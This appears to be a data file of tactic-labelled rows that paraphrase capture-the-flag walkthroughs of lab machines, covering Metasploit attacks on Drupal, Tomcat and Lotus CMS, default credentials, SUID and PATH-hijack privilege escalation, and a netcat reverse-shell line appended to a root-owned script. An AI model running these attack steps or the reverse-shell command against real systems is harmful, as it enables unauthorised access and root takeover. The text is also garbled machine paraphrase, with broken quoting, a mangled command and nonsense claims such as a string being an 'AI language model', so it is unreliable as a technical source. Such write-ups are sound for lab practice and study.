In this particular scenario, the exploit employs the ""handler"" module while configuring a PHP/Meterpreter/Reverse TCP payload."
1059,Commanding,"Upon successfully sending the payload to the target system (192.168.0.105) via the MSF tool, a reverse TCP handler is established on the attacker's machine (192.168.0.107). This action initiates the opening of a Meterpreter session, granting the attacker remote interaction with the target system. Identified as BTRsys1, the target system runs on Linux kernel version 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC. The Meterpreter module utilized in this context is PHP/Linux. With the Meterpreter session now active, exploration ensues, with a focus on inspecting HTML files. Navigating through directories using the ""meterpreter"" tool reveals several PHP files within the /var/www/html directory. Among them, ""config.php"" is singled out, and its contents are displayed. The file seems to serve as a configuration file for a website, containing information about various pages alongside their respective modification dates."
1059,Commanding,"The content details a sequence of actions performed within a terminal session using the Meterpreter tool. Initially, a Bash shell is spawned, followed by a connection to a MySQL database using the credentials ""root"" and ""toor"". Subsequently, the user interacts with the MySQL monitor, entering commands to retrieve information about the server version, copyright details, and available help options. However, the session encounters an error message in the last line of the file, indicating a problem with the MySQL connection. Finally, the user executes a command labeled ""ff,"" presumably to clear the screen or close the terminal window."
1059,Commanding,"The process was completed at a specific date and time. The provided content consists of commands executed within a terminal session using the ""meterpreter"" tool. Initially, the command ""cd /var/www"" changes the directory to ""/var/www"". Subsequently, the command ""cat flag.txt"" is employed to reveal the contents of a file named ""flag.txt"" in the current directory, resulting in the output ""nfbb7asesedodnaasse4ebseencob209""."
1059,Commanding,"The command, developed by Robin Wood and available at https://digi.ninja/, designates a proxy server at IP address 192.168.0.103 and port 3129 for retrieving the file ""/root/Desktop/dict.txt"" from the website ""http://192.168.0.103/blog/."" The Seven Kingdoms blog, focusing on fantasy and medieval themes, can be accessed via Mozilla Firefox at ""https://192.168.0.103/blog.""

1059,Commanding,"After establishing the session, the user gains interaction with the compromised system via the Metasploit console. Subsequently, the user initiates a Python script, creating a new bash process and altering the current working directory to ""/srv/http"". Following this, a listing of the directory contents is performed, and the user displays the contents of the ""reward_flag.txt"" file."
1059,Commanding,"In general, the provided content offers insights into securing digital information. The specific focus is on a file named ""winterfell_messenger,"" and its owner is identified as root. The recommended commands to execute are ""./winterfell_messenger"" and ""cat /root/message.txt."" To enhance the PATH, the instruction is to export, with an initial step of identifying a writable directory, for which ""/tmp"" is suggested."
1059,Commanding,"Subsequently, we navigate to the home directory of the HTTP user to retrieve the desired file. The commands ""cd /srv/http"" and ""ls"" are used for this purpose. The context of the content involves the execution of a program called ""winterfell_messenger"" on an Arch Linux system. This program seeks to access a file named ""message.txt"" in the root directory, but the file is not located. Subsequently, the ""strings"" command is employed to display encoded text extracted from the program's executable file. The displayed text implies that the program is part of a broader system designed for sending encrypted messages and may be associated with the AI language model ""libe_start_main."" Additionally, the version number for the C library ""glibc"" is presented, suggesting that the program was likely developed using this library."
1059,Commanding,"In this series of commands, the user engages in activities related to debugging or potentially reverse engineering a program. The user creates a new file named ""/tmp/cat"" and grants executable permissions to everyone. The user then inspects the current PATH variable, which holds directories where the system looks for executable files during command execution. Subsequently, the PATH variable is altered by adding ""/tmp"" at the beginning, and the modification is confirmed. Following this, the user navigates to ""/srv/http"" and lists the directory contents, revealing a file named ""winterfell_messenger."" The user proceeds to execute the ""winterfell_messenger"" script as root and verifies their identity using the ""id"" command. This sequence of commands appears to be a part of an exploration for a flag. The initial command changes the directory to ""/root,"" followed by an attempt to display the contents of the non-existent file "".flag.txt."" The repeated command yields a string of letters resembling a puzzle, potentially representing the sought-after flag. However, the exact context and significance of this flag remain unclear. The content also exhibits a code snippet in an unidentified programming language, involving actions related to web security. The code loads a URL, splits it into two parts, and performs an action with the split URL.

Additionally, the user possesses access to the root directory with ownership attributed to ""root"" and ""r-x"" permissions."
1059,Commanding,"Command Injection, also known as Shell Injection or OS Injection, occurs when attackers attempt to execute system-level commands directly through a vulnerable application, aiming to retrieve information from the webserver or gain unauthorized access to the server. This type of attack is viable when user-supplied data lacks proper validation before reaching the server, encompassing various forms such as forms, cookies, HTTP headers, etc. Developers often integrate functionalities into web applications using operating system commands, and if the application forwards user-supplied input to the server without adequate validation, it becomes susceptible to command injection attacks. Consider a scenario where a web application permits users to ping a specific IP address through the web interface for host connection confirmation. In this case, if the application directly conveys the user-input IP to the server without validation, it becomes vulnerable to command injection. The provided PHP code snippet illustrates a script that identifies the target machine's operating system, executing a ping command to check its accessibility. For Windows OS, the script uses the ""ping"" command with the specified target IP address, while for Linux-based systems, it employs the ""ping -c 4"" command with the target as an argument. The output of the ping command is then presented on the screen for user visibility."

This tool establishes a connection with the target, transmitting data to initiate a session that grants the attacker command execution privileges on the compromised machine. Upon establishing the connection, the attacker can execute an array of commands, including ""shell"", facilitating access to the victim's machine's command prompt, thereby enabling navigation and execution of commands within the victim's system."
1190,Exploitation,"Furthermore, there exist several scripts, including ""cron.php"", designed to automate server tasks. Additionally, files such as INSTALL.mysqL.txt, MAINTAINERS.txt, flagl.txt, modules, themes, INSTALL.pgsql.txt, README.txt, includes, profiles, and update.php are present."
1190,Exploitation,"Access to the site necessitates authentication via a valid username and password. Upon accessing the web service, we ascertain that the server operates on Drupal CMS. Given the target system's Drupal CMS infrastructure, we proceed to evaluate its susceptibility to the Drupalgeddon2 exploit. Leveraging Metasploit, we initiate the exploit on the target machine, resulting in the successful acquisition of a reverse shell."
1190,Exploitation,"After configuring the exploit with ""msf5 exploit(unix/webapp/drupal drupalgeddon2)"", we set the remote hosts to 192.168.1.104. Subsequently, upon obtaining a reverse shell, we initiate a TTY shell using Python. Further investigation reveals a file on the server with suid permissions, notably with the ""find"" command exhibiting the SUID bit set. Utilizing the command ""python -c 'import pty; pty.spawn(""/bin/bash"")'"", we initiate a search for files with SUID permissions using ""find / -perm -u=s -type f 2>/dev/null"". Given the ""find"" command's SUID bit, we can execute commands as the ""root"" user. To verify this, we create a file named ""raj"" and employ the ""find"" command to ascertain if it executes commands as the root user."
1190,Exploitation,"Upon inspection of the file's contents, we discover a congratulatory message indicating the completion of the VM. The provided text depicts an interaction within the command line utilizing ""msf5,"" employed to exploit a vulnerability within a website utilizing Drupal, an open-source content management system. Establishing a connection with the target machine at IP address 192.168.1.104, the tool transmits stage data totaling 38247 bytes, facilitating the attacker's control over the target system. This is evidenced by the initiation of a ""meterpreter session"" originating from IP addresses 192.168.1.107:4444 -> 192.168.1.104:33183. Subsequently, the attacker executes various commands to delve into the target machine, gathering information such as its operating system, active processes, and installed software."
1190,Exploitation,"Exploring MongoDB through a browser interface, we aim to identify credentials for SSH login. Upon accessing SSH, our objective shifts to determining the kernel version as a precursor to kernel privilege escalation. Once accomplished, we proceed to obtain root access. Additionally, we delve into exploiting Tomcat manager via Metasploit, utilizing 24 distinct methods, while simultaneously generating a bash payload."
1190,Exploitation,"Initiating the process of exploiting the machine, the content outlines two distinct methods. Method 1 commences with the exploration of MongoDB. The walkthrough initiates by conducting a network scan using ""netdiscover"" to identify the target IP. Subsequently, the target IP undergoes scanning with nmap, unveiling an array of open ports, encompassing FTP, SSH, SMTP, DNS, HTTP, POP3, RPC bindings, NetBIOS session service, IMAP, NFS ACL, MySQL, PostgreSQL, and HTTP. Following these initial steps, the exploitation continues."
1190,Exploitation,"Let's embark on the walkthrough! In Method-1's port scanning phase, we observe that port 8080 is accessible for Apache Tomcat/Coyote JSP Engine 1.1. Consequently, we navigate to the Target IP via port 8080 on a web browser. This guide outlines the setup process for Tomcat, a framework utilized for running Java applications. It elucidates that the successful display of this page in a web browser signifies a successful Tomcat setup. The default homepage for Tomcat is located at ""/var/lib/tomcat7/webapps/ROOT/index.html"". For further utilization of Tomcat, it is recommended to install the ""tomcat7-docs"", ""tomcat7-examples"", and ""tomcat7-admin"" packages. These packages offer access to local Tomcat documentation, examples, and management tools for the Tomcat instance."
1190,Exploitation,"It's crucial to highlight that access to the manager webapp requires users to have the ""manager-gui"" role, while the host-manager webapp necessitates the ""admin-gui"" role, both defined in Jetty/tomcat7/tomcat-users.xml. The text ""[ username |: tomcat [ password ]:tomcat Oh Yeah! We have got a meterpreter."" stands alone as a separate sentence. Similarly, ""After extensive enumeration, we discovered a directory /tab containing a file script.sh, owned by root with full permissions,"" forms another independent sentence. ""So we contemplated injecting malicious code into script.sh"" serves as a separate sentence. Likewise, ""use exploit/multi/http/tomcat_mgr_upload set rhost 192.168.1.101 set rport 8080 set httpusername tomcat set httppassword tomcat exploit]"" is distinct, suggesting it might be part of a command or script output."
1190,Exploitation,"Let's proceed! We're tasked with generating a bash code using Msfvenom. This command leverages ""msfvenom"" to craft a payload suitable for execution on Unix-based systems. The payload's purpose is to establish a connection back to the attacker's machine via ""nc"" (netcat) and execute commands directed by the attacker. The specified target IP address is 192.168.1.109, with port number 1234. The resultant payload is stored in a file located at /tmp/vvwjo. Upon execution, it initiates the command ""/bin/sh,"" enabling the execution of further commands transmitted through the established connection."
1190,Exploitation,"Next, append the previously generated malicious code to the script.sh file. This involves executing the command: ""echo 'mkfifo /tmp/vvwjo; nc 192.168.1.109 1234 @</tmp/vvwjo | /bin/sh >/tmp'"". This command seems to be associated with the Metasploit Framework, a tool utilized in penetration testing and exploiting system vulnerabilities. It aims to exploit a weakness in the Apache Tomcat web server software by uploading and executing illicit code. The command specifies crucial parameters including the target IP address (192.168.1.101) and port number (8080), alongside the designated username and password for executing the exploit."
1190,Exploitation,"Upon successfully exploiting the vulnerability, the attacker establishes a Meterpreter session, granting them control over the targeted system. The provided content appears to be a Bash script, which initiates the creation of a unique file named ""mkfifo"" within the ""/tmp"" directory. Subsequently, it establishes a network connection utilizing the ""nc"" command between the local machine and a remote IP address (192.168.1.109) on port 1234. The output of this connection is then directed to the specialized file ""vwwjo"" located in the ""/tmp"" directory, while concurrently being processed by the ""sh"" command."
1190,Exploitation,"Upon accessing the file, we are greeted with a congratulatory message. Exploring Method 3, which involves exploiting Drupal CMS, we found no significant findings on port 80. Consequently, we attempted to enumerate the web directory using the Dirb tool. This script initiates the creation of a specialized pipe known as a ""FIFO"" (short for ""First In, First Out""), facilitating data transmission between two processes. Subsequently, it utilizes the ""nc"" command to establish a connection with a specified IP address and port number, enabling one-way data transmission from the server to the local machine. The script then redirects the output of this connection to a file and executes another command on that file using the ""/bin/sh"" shell."
1190,Exploitation,"It was interesting to note the presence of two content management systems (CMS) as depicted in the provided image. Accessing the URL ""192.168.1.101/drupal/"", it appears to be the homepage of a website hosted on the IP address 192.168.1.101, operated within a virtual machine named ""Typhoon VM."" Currently, the site doesn't display any content on its front page, but users are directed to consult the user guide for assistance in creating their own site. Upon exploring the ""/Drupal"" directory in the web browser, it led to a webpage associated with the Drupal CMS. Without delay, we proceeded to utilize Metasploit, executing the specified module to exploit the Drupal CMS vulnerability. The Metasploit commands configured the target host IP address to 192.168.1.101 and set the target URI to ""/drupal""."
1190,Exploitation,"Executing the exploit command in Metasploit for Drupal's drupalgeddon2 vulnerability, and then proceeding to Method 4, which focuses on exploiting Lotus CMS. Navigating to the ""/cms"" directory in the web browser revealed a webpage linked with Lotus CMS."
1190,Exploitation,"Sending a command to exploit Lotus CMS via Metasploit at the IP address 192.168.1.101/cms.
